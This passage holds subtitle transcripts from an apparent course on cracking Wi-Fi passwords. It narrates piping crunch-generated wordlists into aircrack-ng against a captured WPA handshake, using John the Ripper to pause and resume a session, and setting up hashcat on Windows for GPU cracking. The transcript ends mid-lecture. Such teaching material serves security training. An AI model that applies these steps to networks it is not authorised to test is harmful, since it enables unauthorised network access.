So the result is going to be very similar to what we got when we opened our word list with John the

11
00:01:00,960 --> 00:01:02,820
Ripper in the previous lecture.

12
00:01:02,820 --> 00:01:11,820
And then we're going to pipe that output to Aircrack NG, which will read that as input and process

13
00:01:11,820 --> 00:01:16,200
the word list on the fly as it's being generated on crunch.

14
00:01:16,560 --> 00:01:23,250
This way, the word list will not be stored in a specific file and it won't take a lot of disk space.

15
00:01:24,100 --> 00:01:25,600
Now, let me show you how to do that.

16
00:01:25,600 --> 00:01:27,430
And it's going to become more clear.

17
00:01:29,260 --> 00:01:34,600
So first of all, before I do the whole command, I'm just going to show you the command that we usually

18
00:01:34,600 --> 00:01:35,680
use with Crunch.

19
00:01:35,680 --> 00:01:37,330
So we usually do crunch.

20
00:01:39,060 --> 00:01:44,820
And then we do the minimum number of characters, followed by the maximum number of characters.

21
00:01:46,230 --> 00:01:51,660
And I'm going to set both to eight because this is the minimum number of characters that you can use

22
00:01:51,660 --> 00:01:53,760
in a WPA password.

23
00:01:54,420 --> 00:01:58,950
Then we usually specify the characters to use to generate the word list.

24
00:01:58,980 --> 00:02:04,740
Now, I'm not going to specify any characters right now because I want to use all the characters, So

25
00:02:04,740 --> 00:02:12,660
if I don't specify any characters, Crunch will use Abcdefg all the way up to Z by default.

26
00:02:12,960 --> 00:02:21,300
So all I have to do now is just do -0 to specify the file to save the word list to and let's just save

27
00:02:21,300 --> 00:02:24,150
it to all dot txt.

28
00:02:25,080 --> 00:02:26,550
Now I'm going to hit enter.

29
00:02:28,080 --> 00:02:30,840
And as you can see, this file is going to be huge.

30
00:02:30,840 --> 00:02:37,200
It's going to be one terabyte, 1750GB and this much megabytes.

31
00:02:37,200 --> 00:02:39,420
So it's going to be a huge file.

32
00:02:39,420 --> 00:02:45,840
And I actually don't have enough space on my disk to start that file, so I'm going to do Ctrl C.

33
00:02:46,800 --> 00:02:51,960
And what I'm going to do right now is I'm going to run the same command and I'm just going to omit the

34
00:02:51,960 --> 00:02:53,550
-0 argument.

35
00:02:54,300 --> 00:02:56,720
So what I'm doing right now is crunch.

36
00:02:56,730 --> 00:03:00,810
I'm telling it that I want you to generate passwords of length eight.

37
00:03:00,810 --> 00:03:06,330
And I didn't specify any characters because I wanted to use all characters A to Z.

38
00:03:06,360 --> 00:03:10,080
Now, if you want to use specific characters, you can just type them in here.

39
00:03:10,110 --> 00:03:11,010
A, b, c, d, e.

40
00:03:11,010 --> 00:03:11,340
F, g.

41
00:03:11,370 --> 00:03:12,300
One, two, three.

42
00:03:12,330 --> 00:03:13,920
As I showed you before.

43
00:03:15,540 --> 00:03:20,250
So I'm going to hit enter with this and you'll see that it's still telling me that this is going to

44
00:03:20,250 --> 00:03:26,370
take one terabyte, 1750GB, but it's displaying the result on screen.

45
00:03:26,370 --> 00:03:28,320
It's not storing it in a file.

46
00:03:28,410 --> 00:03:35,790
And if we let this run for a long period of time, it'll actually display all possible combinations

47
00:03:35,790 --> 00:03:42,420
of characters that have a length of eight characters and contain the characters A to Z.

48
00:03:43,050 --> 00:03:47,000
Now I'm going to do control C to this because this is not useful for me.

49
00:03:47,010 --> 00:03:48,720
I'm just doing this to show you.

50
00:03:48,720 --> 00:03:55,200
But if you notice, the output right now is very similar to the output that I got in the previous lecture

51
00:03:55,200 --> 00:04:00,840
when I opened my word list using John the Ripper when we were doing the pause and resume process.

52
00:04:01,760 --> 00:04:06,920
So you can see that the result is being displayed on screen for me now, which is very cool.

53
00:04:06,950 --> 00:04:11,110
So what I want to do right now is I want to pipe this result.

54
00:04:11,120 --> 00:04:14,870
So we usually pipe using this character like we seen before.

55
00:04:15,680 --> 00:04:21,140
So what I want to do right now is I want to pipe the result of this command to aircrack ng.

56
00:04:21,560 --> 00:04:28,040
And like I said earlier, this command is producing a result very similar to the result that we got

57
00:04:28,040 --> 00:04:35,420
from John in the previous lecture, which means the output right now is exactly the same output that

58
00:04:35,420 --> 00:04:38,510
we got from John in the previous lecture.

59
00:04:38,840 --> 00:04:44,840
So the command that we're going to be passing this to can be exactly the same command that we used in

60
00:04:44,840 --> 00:04:47,240
the previous lecture and it should work.

61
00:04:47,870 --> 00:04:51,080
Therefore, all I'm going to do is I'm going to do aircrack ng.

62
00:04:53,450 --> 00:04:57,710
And I'm going to give it the ID of my target network.

63
00:04:59,470 --> 00:05:02,950
Then I'm going to give it minus W to give it the word list.

64
00:05:02,950 --> 00:05:09,610
And just like I did in my previous lecture, I'm going to do a dash to tell it that use the output of

65
00:05:09,610 --> 00:05:13,090
the previous command as the input for the word list.

66
00:05:14,530 --> 00:05:19,400
Then I'm going to give it the handshake file, which is called Handshake zero one Cap.

67
00:05:20,800 --> 00:05:21,640
And that's it.

68
00:05:21,640 --> 00:05:22,630
I'm good to go.

69
00:05:23,260 --> 00:05:28,840
So we're doing a crunch 8 to 8 to generate passwords of length eight from A to Z.

70
00:05:28,960 --> 00:05:31,690
And again, you can use any crunch command right here.

71
00:05:31,690 --> 00:05:37,600
You can use any combination, any characters, any pattern, exactly the same way that I showed you

72
00:05:37,600 --> 00:05:38,890
in the Crunch lecture.

73
00:05:39,670 --> 00:05:44,800
Then we're not using a -0 option because we don't want it to save anything on disk.

74
00:05:44,830 --> 00:05:51,640
We want the result to be displayed on screen and then we're piping that result to aircrack ng.

75
00:05:52,710 --> 00:05:58,950
Now to aircrack ng we're giving it actually should not have a space here.

76
00:05:58,950 --> 00:06:06,660
So we're giving it the ID of the target network, we're giving it the dictionary and we're not actually

77
00:06:06,660 --> 00:06:08,040
given a name for the dictionary.

78
00:06:08,040 --> 00:06:10,020
We only giving it a dash.

79
00:06:10,020 --> 00:06:16,500
And this is because we're telling it that I want you to use the output of the previous command as the

80
00:06:16,500 --> 00:06:17,240
input.

81
00:06:17,250 --> 00:06:23,280
So this is exactly like we did in the previous lecture, and then we're giving it the file that contains

82
00:06:23,280 --> 00:06:24,240
the handshake.

83
00:06:24,990 --> 00:06:26,430
Now, if I hit enter.

84
00:06:28,610 --> 00:06:30,560
I misspelled aircrack ng.

85
00:06:30,650 --> 00:06:32,960
So it's like this.

86
00:06:33,470 --> 00:06:34,910
Now if I hit enter.

87
00:06:38,220 --> 00:06:41,400
And as you can see now, Aircrack NG is working.

88
00:06:41,430 --> 00:06:50,160
It's taking the passwords generated by crunch on the fly and using them as the dictionary so the wordlist

89
00:06:50,160 --> 00:06:52,300
is not being stored on my disk.

90
00:06:52,320 --> 00:06:58,560
My disk will not get full and this way we'll be able to use huge wordlists for cracking.

91
00:06:59,040 --> 00:07:05,400
The only problem right now is this wordlist is really, really big and there is no way we can go through

92
00:07:05,400 --> 00:07:06,770
it within one session.

93
00:07:06,780 --> 00:07:15,000
So it'll be great if we can save our progress and be able to stop and continue whenever we have the

94
00:07:15,000 --> 00:07:15,630
time.

95
00:07:16,140 --> 00:07:21,510
So in the next lecture, I'm going to show you how to combine what we learned in this lecture and in

96
00:07:21,510 --> 00:07:28,680
the previous lecture so that we can use a huge wordlist and use it directly with aircrack ng without

97
00:07:28,680 --> 00:07:33,930
saving it on disk and also be able to stop and resume our progress.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,710 --> 00:00:08,270
So far we've seen how we can use piping to store our cracking progress, and we've seen how to use it

2
00:00:08,270 --> 00:00:16,220
to generate a word list and pipe it to aircrack ng on the fly without storing that word list on disk,

3
00:00:16,220 --> 00:00:22,400
which allows us to use huge word lists that we don't even have enough space to store ultimately.

4
00:00:22,400 --> 00:00:28,880
And what I want to show you in this lecture is how to combine both of these ideas so that we can use

5
00:00:28,880 --> 00:00:37,220
huge word lists without storing them on our disk and at the same time be able to pause and resume whenever

6
00:00:37,220 --> 00:00:42,080
we want so we can store our cracking progress again.

7
00:00:42,080 --> 00:00:46,400
We're going to be using pipe in this time and we're going to be combining everything that we learned

8
00:00:46,400 --> 00:00:47,240
so far.

9
00:00:47,390 --> 00:00:49,670
So the idea is going to be like this.

10
00:00:49,670 --> 00:00:54,320
First, we're going to be using Crunch to create our word list.

11
00:00:54,350 --> 00:00:59,570
We're going to pass the word list to John, which will read the word list made by crunch.

12
00:00:59,570 --> 00:01:03,120
And it'll allow us to save and restore our progress on.

13
00:01:03,120 --> 00:01:09,660
The only reason we're using, John, is to be able to store the location where we reached in the word

14
00:01:09,660 --> 00:01:14,340
list so that when we start the cracking again, we don't start from the start of the word list.

15
00:01:14,370 --> 00:01:16,380
We start from where we left.

16
00:01:16,880 --> 00:01:22,070
Then, since John knows where we stopped, we're going to start from there and it's going to modify

17
00:01:22,070 --> 00:01:22,760
our word list.

18
00:01:22,760 --> 00:01:27,530
So it's going to take out, for example, the first 10,000 words that we tried already.

19
00:01:27,530 --> 00:01:32,870
So we're going to have a modified word list, and that's the one that we're going to be piping or passing

20
00:01:32,900 --> 00:01:38,390
to aircrack NG, which will do the cracking, which will do all of the heavy work, if you want to think

21
00:01:38,390 --> 00:01:39,290
of it that way.

22
00:01:40,010 --> 00:01:45,170
So right now we're going to be combining what we learned so far, and let me show you how to do it.

23
00:01:45,170 --> 00:01:47,420
It'll become much more clear when we do it.

24
00:01:48,690 --> 00:01:50,430
So have my terminal here.

25
00:01:50,430 --> 00:01:55,050
And like we said, the first thing that we want to do is to generate our word list.

26
00:01:55,050 --> 00:01:59,880
And again, you can use any crunch command you want, but right now I'm going to use the command that

27
00:01:59,880 --> 00:02:04,050
I used in my previous lecture, which is just crunch eight, eight.

28
00:02:04,960 --> 00:02:11,800
Like I said before, this will generate word list of length eight and it will use combinations of all

29
00:02:11,800 --> 00:02:13,630
of the small alphabet characters.

30
00:02:13,630 --> 00:02:16,690
So it's A, B, C, D, up to Z, all small.

31
00:02:16,690 --> 00:02:18,850
Now, this is a very big word list.

32
00:02:18,850 --> 00:02:24,260
And if you want to use something custom, something different, then you can put the command here the

33
00:02:24,310 --> 00:02:28,360
any, any way you want, as I showed you before in the Crunch lecture.

34
00:02:28,360 --> 00:02:32,620
But for now, we're just going to keep it at this because this is a big enough word list.

35
00:02:33,010 --> 00:02:40,300
Then we're going to use the pipe character to pipe the result of this command to John because we said

36
00:02:40,300 --> 00:02:45,250
we're going to use John to allow us to store and resume our progress.

37
00:02:45,250 --> 00:02:47,560
So our command is going to be John.

38
00:02:49,750 --> 00:02:56,620
And if you remember in the lecture where we did the pause and resume, we passed a word list and already

39
00:02:56,620 --> 00:02:58,300
made word list to John.

40
00:02:58,420 --> 00:03:04,330
Now, in this case, Crunch is making the word list for us and it's being passed to John.

41
00:03:04,330 --> 00:03:08,080
So it's being passed to John as the standard input.

42
00:03:08,110 --> 00:03:14,980
So we're going to tell John to read the word list from the standard input and we can do that using the

43
00:03:15,040 --> 00:03:17,380
STD n argument.

44
00:03:18,560 --> 00:03:20,540
Then we're going to give it a session name.

45
00:03:20,540 --> 00:03:23,550
So this is the name of our cracking session.

46
00:03:23,570 --> 00:03:25,610
So I'm going to do session.

47
00:03:27,310 --> 00:03:30,040
And let's call it session one.

48
00:03:30,600 --> 00:03:34,170
Then, just like we did before in the join lecture.

49
00:03:34,170 --> 00:03:37,680
We want to pass all of this to aircrack ng.

50
00:03:37,770 --> 00:03:43,050
So we want it to display the wordlist that it's going to modify on the standard output.

51
00:03:43,050 --> 00:03:47,100
And again, we do this using the STD out argument.

52
00:03:49,430 --> 00:03:52,830
Now we're generating our word list using crunch.

53
00:03:52,850 --> 00:03:59,840
We're passing the result to John, and we're telling John that I want you to read this from the standard

54
00:03:59,840 --> 00:04:07,550
input and store all of the session in a session called Session one and display the result on screen

55
00:04:07,550 --> 00:04:11,240
on Stdout, so on the standard output.

56
00:04:12,050 --> 00:04:16,850
Then the last thing that we're going to do is pass this to aircrack ng.

57
00:04:17,210 --> 00:04:23,450
So our command is going to be aircrack ng exactly the same command that we've been using in the previous

58
00:04:23,450 --> 00:04:24,230
lectures.

59
00:04:25,160 --> 00:04:28,700
Minus B to give it the ID of my target.

60
00:04:30,090 --> 00:04:32,010
Then we're going to do minus W.

61
00:04:33,360 --> 00:04:35,940
And we usually give the word list after this.

62
00:04:35,940 --> 00:04:41,760
But as we've seen in previous lectures, when we're piping the word list, we give it a dash to tell

63
00:04:41,760 --> 00:04:44,850
it to read the word list from the standard input.

64
00:04:45,570 --> 00:04:48,780
Then we give it the file that contains the handshake.

65
00:04:48,780 --> 00:04:52,710
And in my case, it's called handshake minus 01. cap.

66
00:04:53,910 --> 00:04:59,340
So let me go through the command one more time just so that everything is clear.

67
00:04:59,640 --> 00:05:02,510
So the first command is crunch eight, eight.

68
00:05:02,520 --> 00:05:07,800
And as we've seen before, this command will display the word list on screen.

69
00:05:07,800 --> 00:05:10,800
So it's displaying the word list on the standard input.

70
00:05:10,830 --> 00:05:19,380
We put the pipe character to pipe the standard input into John and then we tell John to read its word

71
00:05:19,380 --> 00:05:21,000
list from the standard input.

72
00:05:21,000 --> 00:05:23,640
Before we used to give John a word list.

73
00:05:23,640 --> 00:05:28,020
But right now I'm telling John to read your word list from the standard input.

74
00:05:28,050 --> 00:05:31,380
I want you to store this in a session called Session one.

75
00:05:32,330 --> 00:05:35,930
And I want you to display that on the standard output.

76
00:05:36,600 --> 00:05:39,540
So that's again, displaying it on screen.

77
00:05:39,810 --> 00:05:45,210
Then we're piping the standard output as an input for aircrack ng.

78
00:05:45,990 --> 00:05:53,640
We're given the bssid of my target of my target network and then we're telling Aircrack ng to read the

79
00:05:53,640 --> 00:05:57,930
word list from the standard input by giving it the dash in here.

80
00:05:58,440 --> 00:06:03,000
And then we're giving it the handshake file that contains my handshake.

81
00:06:03,760 --> 00:06:05,230
Now I'm going to hit Enter.

82
00:06:08,510 --> 00:06:12,400
And as you can see now, Aircrack ng starts the cracking process.

83
00:06:12,410 --> 00:06:19,280
It's reading the wordlist that's being generated by crunch on the fly and that wordlist is going to

84
00:06:19,280 --> 00:06:22,970
contain characters from A to Z, all small characters.

85
00:06:22,970 --> 00:06:28,280
And as you can see now, Aircrack NG is going through these word by word right now.

86
00:06:28,550 --> 00:06:34,610
Now, if we do control C at the same time, our progress is going to be saved.

87
00:06:35,240 --> 00:06:36,800
So I'm going to do control C.

88
00:06:39,340 --> 00:06:46,300
And let's see how we can restore our session and start from where we left in here.

89
00:06:46,930 --> 00:06:49,990
So I'm going to do I'm going to clear this.

90
00:06:52,620 --> 00:06:57,600
So again, the first thing that we're going to do is generate our word list and it's going to be crunch

91
00:06:57,630 --> 00:06:58,470
eight eight.

92
00:07:02,040 --> 00:07:05,130
Then we're going to pipe this to John.

93
00:07:06,720 --> 00:07:08,700
And we're going to tell John this time.

94
00:07:08,700 --> 00:07:14,910
Last time we told it to read the word list from the standard input and then display it on the standard

95
00:07:14,910 --> 00:07:15,600
output.

96
00:07:15,600 --> 00:07:17,310
Right now, we don't need to do that.

97
00:07:17,310 --> 00:07:20,880
All we have to do is just tell John to restore.

98
00:07:23,270 --> 00:07:25,280
And give it the name of my session.

99
00:07:25,280 --> 00:07:28,130
And the name of my session was session one.

100
00:07:29,870 --> 00:07:33,020
Then this will display everything on screen.

101
00:07:33,020 --> 00:07:37,850
So it's going to display the modified word list from this on screen.

102
00:07:37,850 --> 00:07:44,210
And then I'd want to pass this to Aircrack NG And again, my aircrack ng is going to be very similar

103
00:07:44,210 --> 00:07:47,900
to the aircrack ng that I've been using, so it's going to be aircrack ng.

104
00:07:48,980 --> 00:07:52,850
We're going to give it the ID of my target network.

105
00:07:53,530 --> 00:07:55,960
We're going to give it the word list.

106
00:07:55,960 --> 00:08:01,330
And again, we're going to use the dash to tell Aircrack ng to read the word list from the standard

107
00:08:01,330 --> 00:08:01,900
input.

108
00:08:01,900 --> 00:08:04,720
So I'm not giving it an actual file.

109
00:08:04,720 --> 00:08:09,550
And then we're going to give it the name of the file that contains the handshake, which is handshake

110
00:08:09,550 --> 00:08:10,860
01. cap.

111
00:08:12,740 --> 00:08:15,680
Now, let me explain to you what's going to happen.

112
00:08:15,770 --> 00:08:20,540
So first of all, we're doing crunch 8 to 8 to generate the word list.

113
00:08:20,750 --> 00:08:25,760
And with this, because we want it to keep generating the word list because, for example, let's say

114
00:08:25,760 --> 00:08:27,710
we reached line 10,000.

115
00:08:27,740 --> 00:08:30,410
We want it to start from line 10,000.

116
00:08:30,410 --> 00:08:33,920
So we still have to use Crunch to start from there.

117
00:08:34,130 --> 00:08:39,950
And then we're using John to restart our session because Crunch doesn't know where we were.

118
00:08:39,980 --> 00:08:46,280
So using John, we're going to be starting from the line where we left off.

119
00:08:47,420 --> 00:08:52,670
John is going to display that on screen and we're piping that output.

120
00:08:52,670 --> 00:08:59,090
So the screen is the standard output and we're piping that output to the standard input of aircrack

121
00:08:59,090 --> 00:09:00,560
ng and aircrack.

122
00:09:00,560 --> 00:09:08,720
NG is catching that because we're doing minus w dash which tells aircrack ng to read its wordlist from

123
00:09:08,720 --> 00:09:12,560
the standard input which is being being piped by John.

124
00:09:14,030 --> 00:09:17,660
Then we're giving it the name of the file that contains the handshake.

125
00:09:18,170 --> 00:09:22,990
Now, if I hit enter, I should start cracking from ay ay ay ay ay.

126
00:09:23,180 --> 00:09:26,690
Instead of starting from ay ay ay ay ay ay ay ay ay ay.

127
00:09:26,870 --> 00:09:28,280
So I'm going to hit enter.

128
00:09:29,540 --> 00:09:37,100
And as you can see, we are at RJ, which basically comes after AI, which basically means that we restart

129
00:09:37,100 --> 00:09:44,480
our session and using this method now we can first of all restore our session so we can stop and resume

130
00:09:44,480 --> 00:09:45,920
whenever we have the time.

131
00:09:45,920 --> 00:09:51,650
We can use huge word lists because we're not storing the word list on disk, we're generating the word

132
00:09:51,650 --> 00:09:55,430
list on the fly and then piping it to aircrack NG.

133
00:09:55,820 --> 00:10:02,120
So with this method we can use huge word lists and we can store our progress without using too much

134
00:10:02,120 --> 00:10:04,220
space on our computer.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:01,040 --> 00:00:05,240
Now every time we use aircrack ng regardless of the method.

2
00:00:05,360 --> 00:00:13,580
Aircrack ng will use the CPU or the central processing unit to process the passwords and try them against

3
00:00:13,580 --> 00:00:14,380
the handshake.

4
00:00:14,390 --> 00:00:21,080
So basically the processor or the CPU is what's being used in the cracking process.

5
00:00:21,350 --> 00:00:27,770
Now this is usually the default behavior of most tools because the CPU is the brains of the computer,

6
00:00:27,770 --> 00:00:33,830
it's the central processing unit and thus the default component that's used when the computer needs

7
00:00:33,830 --> 00:00:35,300
to process data.

8
00:00:36,380 --> 00:00:43,280
Now, if we pause for a second and think a lot of computers also contain another processing unit, which

9
00:00:43,280 --> 00:00:44,720
is the GPU.

10
00:00:44,750 --> 00:00:51,680
The GPU stands for the graphics processing unit and it's built and designed so that they can carry out

11
00:00:51,680 --> 00:00:53,960
repetitive tasks very quickly.

12
00:00:53,990 --> 00:01:00,680
For example, rendering pixels on the screen is a very repetitive task because it literally loops over

13
00:01:00,680 --> 00:01:03,860
each pixel on screen and displays data in it.

14
00:01:03,950 --> 00:01:11,450
Therefore, the process of key cracking is very similar in its essence to rendering pixels on screen,

15
00:01:11,450 --> 00:01:12,410
for example.

16
00:01:12,440 --> 00:01:18,620
Basically, it's a very repetitive task because we go through the word list and we take each password

17
00:01:18,620 --> 00:01:24,830
in the word list and then try to test it against the handshake and see if it's valid or not.

18
00:01:24,830 --> 00:01:26,840
So it's a very repetitive task.

19
00:01:26,840 --> 00:01:33,620
And because the GPUs are optimized to carry out repetitive tasks very quickly, they're actually more

20
00:01:33,620 --> 00:01:36,870
efficient than CPUs when it comes to cracking.

21
00:01:37,290 --> 00:01:44,670
So if you have a good graphics card, you can use that graphics card or GPU in the cracking process

22
00:01:44,670 --> 00:01:46,230
instead of the CPU.

23
00:01:46,230 --> 00:01:52,860
And that way you'll be able to go through the word list and carry out the cracking process much faster

24
00:01:52,860 --> 00:01:55,040
than if you would do it with the CPU.

25
00:01:55,050 --> 00:01:56,940
And that's the main goal of this lecture.

26
00:01:56,940 --> 00:02:03,540
I want to show you how to use the GPU in the cracking process instead of the CPU and we'll see how fast

27
00:02:03,540 --> 00:02:07,080
that is compared to the speed that we were getting with the CPU.

28
00:02:07,960 --> 00:02:14,290
Now, first of all, before we do anything, you need to have a powerful GPU or at least a good graphics

29
00:02:14,290 --> 00:02:14,860
card.

30
00:02:14,890 --> 00:02:20,860
We're going to use a tool called Hashcat for the cracking process because Aircrack NG does not allow

31
00:02:20,860 --> 00:02:24,010
us to use the graphics card in the cracking.

32
00:02:24,490 --> 00:02:31,330
I'm also going to do this from a Windows machine because most GPUs have drivers for Windows and it'll

33
00:02:31,360 --> 00:02:34,320
be very difficult to install their drivers for Linux.

34
00:02:34,330 --> 00:02:38,950
So if you're if you can install your driver for Linux, then it's okay.

35
00:02:38,950 --> 00:02:43,450
You can use Hashcat from Linux exactly the same way that I'm going to show it in this video, but I'm

36
00:02:43,450 --> 00:02:49,480
showing you how to do it from Windows because it's actually much easier to install the drivers for graphics

37
00:02:49,480 --> 00:02:55,480
card for Windows because most manufacturers release official drivers for Windows, whereas when you

38
00:02:55,480 --> 00:02:59,620
go to Linux, you might have to install third party packages to get it to work.

39
00:03:00,650 --> 00:03:03,540
So I have the website here for Hashcat.

40
00:03:03,560 --> 00:03:05,570
I'm going to include it in the resources.

41
00:03:05,630 --> 00:03:12,050
Now, before you can use Hashcat, you'll have to download the driver requirements for your GPU.

42
00:03:12,200 --> 00:03:17,150
So you can see in here we have a list of the drivers that you need to download.

43
00:03:17,150 --> 00:03:23,150
So if you have an AMD GPU, you'll need to download the AMD Radeon software for Linux.

44
00:03:23,150 --> 00:03:27,740
You'll have to download the Amdgpu pro driver and so on.

45
00:03:27,980 --> 00:03:34,550
Now I'm on Windows, so I'm just going to highlight this and I'm going to right click and search Google

46
00:03:34,550 --> 00:03:35,240
for it.

47
00:03:35,630 --> 00:03:38,750
Now you'll see the first result will come up with the right result.

48
00:03:38,750 --> 00:03:40,310
So I'm just going to click it.

49
00:03:41,660 --> 00:03:44,930
And then you can see I can download it from here.

50
00:03:45,200 --> 00:03:47,240
Installing it is very easy.

51
00:03:47,240 --> 00:03:51,530
Just double click the downloaded file, then next, next, next, next.

52
00:03:51,530 --> 00:03:55,520
And then your computer will restart and you'll have it installed.

53
00:03:55,550 --> 00:04:00,710
Now I've already done all of that, so I'm going to go back to Hashcat and I'm going to go ahead and

54
00:04:00,710 --> 00:04:03,230
download the binary of Hashcat.

55
00:04:05,150 --> 00:04:09,980
And as you can see now, that's downloaded for me and it's gone in the downloads directory.

56
00:04:11,560 --> 00:04:13,300
So it says zipped file.

57
00:04:13,300 --> 00:04:14,640
It's a seven zip file.

58
00:04:14,650 --> 00:04:17,270
You'll need an archive manager to open it.

59
00:04:17,290 --> 00:04:22,540
I already have winrar installed, so I'm just going to double click it and that's going to be opened

60
00:04:22,540 --> 00:04:23,470
in Winrar.

61
00:04:23,890 --> 00:04:32,050
Now I'm going to click its directory here, click on extract to to uncompress it and I'm going to choose

62
00:04:32,050 --> 00:04:34,690
to uncompress it in my C directory.

63
00:04:35,910 --> 00:04:36,630
I'm going to hit.

64
00:04:36,630 --> 00:04:37,320
Okay.

65
00:04:37,920 --> 00:04:42,480
And that will basically put the files for hashcat in my C directory.

66
00:04:44,250 --> 00:04:50,580
Now the next step is going to be converting my handshake to a file that's compatible with Hashcat.

67
00:04:50,610 --> 00:04:56,430
Now, when we capture the handshake, as we've seen in all the previous lectures, it's usually stored

68
00:04:56,430 --> 00:04:59,640
in a file that has a cap extension.

69
00:04:59,640 --> 00:05:00,840
So dot cap.

70
00:05:01,200 --> 00:05:07,890
Now, Hashcat can't read the dot cap files, so we'll have to convert this to a file that's compatible

71
00:05:07,890 --> 00:05:08,880
with Hashcat.

72
00:05:09,150 --> 00:05:14,320
Now we can do that very easily using an online tool made by Hashcat.

73
00:05:14,340 --> 00:05:15,720
So I have it right here.

74
00:05:15,720 --> 00:05:18,450
And again, I'm going to include its link in the resources.

75
00:05:18,930 --> 00:05:21,900
Now all you'll have to do is just go on choose file.

76
00:05:22,600 --> 00:05:25,660
Choose the cap file that contains the handshake.

77
00:05:26,830 --> 00:05:28,150
Click on Open.

78
00:05:29,910 --> 00:05:33,870
And then put the network name in the Sid Field.

79
00:05:33,900 --> 00:05:39,840
Now my network name is already stored in there, so it's UPC 723762.

80
00:05:40,530 --> 00:05:42,630
I'm going to click on Convert.

81
00:05:43,310 --> 00:05:51,260
Now, as you can see now this automatically changed the file type to a cab file and it automatically

82
00:05:51,260 --> 00:05:53,150
downloaded it for me as well.

83
00:05:53,390 --> 00:06:01,320
So if I go to my downloads directory, you can see that I have a new file here and it has a hcpcs extension.

84
00:06:01,340 --> 00:06:06,050
This is the extension that Hashcat can read and understand.

85
00:06:07,050 --> 00:06:12,090
Now I'm just going to rename this file and I'm going to call it handshake so that it's easier for us

86
00:06:12,090 --> 00:06:12,780
to know.

87
00:06:13,920 --> 00:06:14,900
Now we're all set.

88
00:06:14,910 --> 00:06:16,590
I have my handshake here.

89
00:06:17,250 --> 00:06:21,990
And I also have my word list right here, which is called Rockyou.

90
00:06:22,290 --> 00:06:25,140
And I'm just going to copy both of these files.

91
00:06:28,480 --> 00:06:31,240
And put them in the same directory as hashcat.

92
00:06:31,330 --> 00:06:35,350
So I put hashcat in C so it's in my PC.

93
00:06:35,770 --> 00:06:38,590
C And it's called Hashcat.

94
00:06:40,080 --> 00:06:44,370
And I'm going to paste the word list and the handshake in here.

95
00:06:47,460 --> 00:06:48,780
Now we're all set.

96
00:06:48,810 --> 00:06:55,200
We have our word list and the handshake on the same directory as hashcat binary.

97
00:06:55,230 --> 00:06:57,480
So now we're ready to use Hashcat.

98
00:06:57,480 --> 00:07:05,250
And all we have to do is we have to navigate here from Windows Command prompt and then run hashcat against

99
00:07:05,250 --> 00:07:08,910
this handshake with the dictionary that we just copied.

100
00:07:09,090 --> 00:07:15,450
So in the next lecture I'm going to show you how to use Hashcat from the Windows Command prompt to crack

101
00:07:15,480 --> 00:07:19,350
the handshake using the GPU instead of the CPU.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,590 --> 00:00:01,130
All right.

2
00:00:01,160 --> 00:00:06,290
Now that we have everything ready, I have hashcat already extracted in here.

3
00:00:06,290 --> 00:00:12,950
I have my handshake and my word list, so I'm ready to use Hashcat to crack the password.

4
00:00:13,310 --> 00:00:16,130
So first of all, we have to open the command prompt.

5
00:00:16,130 --> 00:00:18,290
So I'm going to go to the start menu.

6
00:00:18,470 --> 00:00:21,740
I'm going to type CMD to access my command prompt.

7
00:00:22,980 --> 00:00:27,530
Now I'm going to navigate to the location where I extracted Hashcat.

8
00:00:27,540 --> 00:00:34,410
So it was in C, so I'm going to do is I'm going to do C, D forward slash to go all the way back to

9
00:00:34,410 --> 00:00:36,930
the root of the C directory.

10
00:00:37,520 --> 00:00:41,180
Then I'm going to do Dir to list all available directories.

11
00:00:41,180 --> 00:00:44,180
This is the equivalent to LS in Linux.

12
00:00:45,640 --> 00:00:49,090
And as you can see now, I have a directory called Hashcat.

13
00:00:49,390 --> 00:00:51,720
So I want to navigate into that.

14
00:00:51,730 --> 00:00:58,660
And to do that, we're going to do CD Hashcat and I'm going to press tab to Autocomplete and then I'm

15
00:00:58,660 --> 00:01:03,540
going to do there again to list all the files in this current directory.

16
00:01:03,550 --> 00:01:07,000
And as you can see, I have hashcat binaries in here.

17
00:01:07,000 --> 00:01:11,200
I have a 32 bit and a 64 bit binary.

18
00:01:11,200 --> 00:01:15,370
So you need to run the one that's compatible with your processor.

19
00:01:15,370 --> 00:01:23,620
And you can see I also have my handshake that I copied earlier and I have my word list right there.

20
00:01:24,770 --> 00:01:33,680
Now to run Hashcat we're going to do Hashcat 64 dot x and I'm going to do dash dash help to see all

21
00:01:33,680 --> 00:01:36,740
the options and arguments that I can use with the tool.

22
00:01:39,010 --> 00:01:45,550
And as you can see, we get a big list that shows us all the options and how to exactly use the tool.

23
00:01:47,060 --> 00:01:50,870
So at the top here, you can see the usage of the tool.

24
00:01:50,870 --> 00:01:54,620
So this is the default syntax that you should use the tool with.

25
00:01:54,650 --> 00:01:59,780
And this is exactly the same whether you use the tool from Linux or from Windows.

26
00:01:59,780 --> 00:02:01,910
So I'm showing you how to use it from Windows.

27
00:02:01,910 --> 00:02:08,270
But if you manage to install your graphics card drivers on your Linux, then you can use it the same

28
00:02:08,270 --> 00:02:09,830
way that I'm showing you here.

29
00:02:10,040 --> 00:02:14,960
So basically you need to give the tool name at the start, which is Hashcat.

30
00:02:15,260 --> 00:02:20,750
Then we're going to set the options and you can see we have a big list of options here at the bottom.

31
00:02:22,030 --> 00:02:27,250
Then you are going to give the file that contains the data that you want to crack.

32
00:02:27,280 --> 00:02:34,840
And in our case, it's the hcpcs file, followed by the dictionary to run the attack.

33
00:02:34,840 --> 00:02:37,390
And in our case, it's going to be called Rockyou.

34
00:02:38,860 --> 00:02:43,210
So I'm going to type in Hashcat now because I'm on Windows.

35
00:02:43,210 --> 00:02:48,700
I'm going to have to type Hashcat 64 dot x e, but if you're on Linux, you're just going to do Hashcat

36
00:02:49,120 --> 00:02:51,610
then we're going to have to set the options.

37
00:02:51,610 --> 00:02:58,300
And as you can see, we have a huge list of options that we can set for each option, we can see the

38
00:02:58,300 --> 00:02:59,350
option name.

39
00:03:00,330 --> 00:03:01,560
We can see the type.

40
00:03:01,560 --> 00:03:03,930
So this is the value that this option can take.

41
00:03:03,960 --> 00:03:07,170
It can be a number, it could be a file, it could be a character.

42
00:03:07,440 --> 00:03:09,180
We can see the description.

43
00:03:09,180 --> 00:03:12,690
So this tells us what we can set with this option.

44
00:03:12,690 --> 00:03:19,290
And then we have an example at the end showing us an example of setting this option to a certain value.

45
00:03:20,980 --> 00:03:26,560
